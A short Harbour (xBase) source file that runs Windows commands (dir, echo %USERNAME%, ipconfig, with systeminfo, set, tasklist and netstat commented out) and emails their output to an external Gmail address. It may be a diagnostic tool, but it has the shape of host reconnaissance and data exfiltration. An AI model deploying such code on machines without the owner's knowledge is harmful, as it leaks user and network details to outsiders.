// 2022-11-03 20:13
PROCEDURE MAIN

   LOCAL aCommand := {}, cCommand
   LOCAL cLabel := "noteradeon"
   
   LOCAL cCommandTodos := ""
   LOCAL  cTo := "hbmshell@gmail.com" //"vlademirolandim@gmail.com"
      
   AADD( aCommand , "dir" )
   AADD( aCommand , "echo %USERNAME%" )
   //AADD( aCommand , "set" )
   AADD( aCommand , "ipconfig" )
   //AADD( aCommand , "Systeminfo" )
   //AADD( aCommand , "Tasklist" )
   //AADD( aCommand , "driverquery -v" )
   //AADD( aCommand , "Netstat" )
   
   //AADD( aCommand , "Ping google.com" )
  // AADD( aCommand , "nslookup" )
   
   
   FOR x := 1 TO LEN( aCommand )
       EXEC RUN aCommand[x]  TO cCommand
       cCommandTodos += StrZero(x,3) + ") " + aCommand[x] + hb_eol()
       cCommandTodos += Replicate("-",80) + hb_eol()
       cCommandTodos += cCommand + hb_eol()
   NEXT

   EnviaEmail( cTo, "Resultado da máquina " + cLabel , cCommandTodos )
   
 RETURN  


